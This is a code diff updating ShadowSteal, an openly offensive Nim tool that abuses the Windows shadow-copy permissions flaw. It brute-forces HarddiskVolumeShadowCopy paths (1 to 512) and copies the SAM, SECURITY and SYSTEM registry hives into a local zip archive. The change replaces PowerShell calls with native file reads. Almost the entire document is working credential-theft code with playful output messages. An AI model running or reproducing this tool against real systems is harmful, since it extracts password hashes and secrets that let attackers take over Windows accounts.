@@ -1,20 +1,23 @@
 #[
-    ShadowSteal | Nim Implementation | v.02 THE JEFF BEEZY UPDATE
+    ShadowSteal | Nim Implementation | v.03.69 the N I C E update
     Author: HuskyHacks
     Original Disclose by @jonasLyk :)
     POC: enumerates host drives for shadow volumes of SAM, SYSTEM, and SECURITY hive keys.
     First build: naive implementation, no OPSEC considerations, hacky, and that's the way I like it.
     PRs welcome :)
+    Now featuring cleaner code, thank you to @orbitalgun!
+    Coming soon: @gentilkiwi's recommendation to use the API instead of bruteforcing
 ]#
 
 import os
-import osproc
 import strutils
 import times
 import zippy/ziparchives
 import random
 import argparse
 import sequtils
+import tables
+import winim
 
 
 var p = newParser:
@@ -23,19 +26,26 @@ var p = newParser:
     flag("-bf", "--bruteforce", help="[*] Bruteforce mode. Enumerates the entire range of possible locations (512 to 1). Takes a bit.")
     flag("-b", "--bezos", help="[?] Jeff Bezos Mode")
 
+
 let time = cast[string](format(now(), "yyyyMMddhhmm"))
 
 # Fantastic tip from @vinopaljiri: the maximum possible number of shadow copies is 512, and you probably want the one that is numbered highest. Algorithm now decrements to find the target files.
 # Brute Force solution for now. Binary search tree coming soon.
 
 proc search(min: int, max: int): int =
-    var results: seq[int] = @[] 
-    for i in countdown(max, min):
-        var cmdString: string = "[System.IO.File]::Exists('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $i & "\\Windows\\System32\\config\\SAM\')"
-        let cmd = "powershell.exe -c \"" & cmdString & "\""
-        echo "[*] Checking for HarddiskVolumeShadowCopy" & $i
-        let outcome = (execProcess(cmd))
-        if "True" in outcome:
+
+    var isFound: bool = false
+
+    echo "[*] Executing ShadowSteal..."
+    echo "[*] Time: ", time
+    echo "[*] Searching for shadow volumes on this host..."
+    
+    var results: seq[int] = @[]
+    for i in countdown(max,min):
+        let configPath = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $i & "\\Windows\\System32\\config\\SAM"
+        echo "[*] Checking HarddiskVolumeShadowCopy" & $i
+        if fileExists(configPath):
+            isFound = true
             echo "[+] Hit!"
             echo "[+] HarddiskVolumeShadowCopy" & $i & " identified."
             results.add(i)
@@ -43,30 +53,28 @@ proc search(min: int, max: int): int =
             var nopes = ["Nope", "Nah fam", "Nein", "Negative", "No", "Not there", "No way", "No :("]
             let nope = sample(nopes)
             echo "[-] " & nope
-    let location = results[maxIndex(results)]
-    echo "[+] Highest Shadow Volume located: HarddiskVolumeShadowCopy" & $location
-    echo "[*] This likely has the most up to date credential information. Exploiting!"
-    return location
-
+    if isFound:
+        let location = results[maxIndex(results)]
+        echo "[+] Highest Shadow Volume located: HarddiskVolumeShadowCopy" & $location
+        echo "[*] This likely has the most up to date credential information. Exploiting!"
+        return location
+    else:
+        echo "[-] No luck, fam."
+        quit(0)
 
 proc exploit(location: int): void =
-            var keys = @["SAM", "SECURITY", "SYSTEM"]
-            echo "[+] Exfiltrating the contents of the config directory..."
-            let dir = "HarddiskVolumeShadowCopy" & $location
-            if not dirExists(dir):
-                createDir(dir)
-            for key in keys:
-                let stealName = time & "_" & key
-                let exfilSAMString = "[System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $location & "\\Windows\\System32\\config\\" & key & "\', '" & dir & "\\" & stealName & "')"
-                let exfilPScmd = "powershell.exe -c \"" & exfilSAMString & "\""
-                discard(execProcess(exfilPScmd))
-            echo "[+] Hives extracted!"
-            echo "[*] Compressing... "
-            var compressName = time & "_" & "ShadowSteal.zip"
-            createZipArchive(dir, compressName)
-            removeDir(dir)
-            echo "[+++] SUCCESS!"
-            echo "[+++] SAM, SECURITY, and SYSTEM Hives have been extracted to " & cast[string](compressName) & "."
+    let archive = ZipArchive()
+    let configPath = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $location & "\\Windows\\System32\\config\\"
+    echo "[+] Exfiltrating the contents of the config directory..."
+    for elem in @["SAM", "SECURITY", "SYSTEM"]:
+        let fi = getFileInfo(configPath & elem)
+        archive.contents["HarddiskVolumeShadowCopy" & $location & "/" & elem & "_" & $fi.lastWriteTime] = ArchiveEntry(contents: readFile(configPath & elem))
+    echo "[+] Hives extracted!"
+    echo "[*] Compressing... ", time & "_ShadowSteal.zip"
+    archive.writeZipArchive(time & "_ShadowSteal.zip")
+
+    echo "[+++] SUCCESS!"
+    echo "[+++] SAM, SECURITY, and SYSTEM Hives have been extracted to " & time & "_ShadowSteal.zip"
 
 
 proc jeffBeezy(): void =
@@ -217,50 +225,44 @@ WMMMMMMMMMMWWWWWWWWNWWWMMMMMMMMMMMWWWNXK00OkxdooolloooodxxkO0KXXNNNWWMMMMMMMMMMM
 
 
 when defined(windows):
-    if defined(i386):
+    when defined(i386):
         echo "[-] Not designed for a 32 bit processor. Exiting..."
         quit(1)
-    else:
-        when isMainModule:
-            # There is probably a much better way to parse args but I'm getting hangry so this will have to do
-            try:
-                let opts = p.parse()
-                echo "[*] Executing ShadowSteal..."
-                echo "[*] Time: ", time
-                echo "[*] Searching for shadow volumes on this host..."
-                if opts.bruteforce and opts.triage:
-                    echo "[-] Cannot brute force and triage. Please pick one."
-                    quit(1)
-                if opts.bruteforce:
-                    let searchMin = 1
-                    let searchMax = 512
-                    echo "[*] Bruteforce mode enabled."
-                    let result = search(searchMin, searchMax)
-                    exploit(result)
-                if opts.triage:
-                    let searchMin = 1
-                    let searchMax = 10
-                    echo "[*] Triage mode enabled."
-                    let result = search(searchMin, searchMax)
-                    exploit(result)
-                else:
-                    let searchMin = 1
-                    let searchMax = 100
-                    echo "[*] Default mode enabled."
-                    let result = search(searchMin, searchMax)
-                    exploit(result)
-                if opts.bezos:
-                    jeffBeezy()
-                echo ""
-                echo "[*] Done! Happy hacking!"
-                quit(0)
-            except ShortCircuit as e:
-                if e.flag == "argparse_help":
-                    echo p.help
-                    quit(1)
-            except UsageError:
-                stderr.writeLine getCurrentExceptionMsg()
+    
+    when isMainModule:
+        # There is probably a much better way to parse args but I'm getting hangry so this will have to do
+        try:
+            let opts = p.parse()
+            if opts.bruteforce and opts.triage:
+                echo "[-] Cannot brute force and triage. Please pick one."
                 quit(1)
-            
-
-        
+            if opts.bruteforce:
+                let searchMin = 1
+                let searchMax = 512
+                echo "[*] Bruteforce mode enabled."
+                let result = search(searchMin, searchMax)
+                exploit(result)
+            if opts.triage:
+                let searchMin = 1
+                let searchMax = 10
+                echo "[*] Triage mode enabled."
+                let result = search(searchMin, searchMax)
+                exploit(result)
+            else:
+                let searchMin = 1
+                let searchMax = 100
+                echo "[*] Default mode enabled."
+                let result = search(searchMin, searchMax)
+                exploit(result)
+            if opts.bezos:
+                jeffBeezy()
+            echo ""
+            echo "[*] Done! Happy hacking!"
+            quit(0)
+        except ShortCircuit as e:
+            if e.flag == "argparse_help":
+                echo p.help
+                quit(1)
+        except UsageError:
+            stderr.writeLine getCurrentExceptionMsg()
+            quit(1)
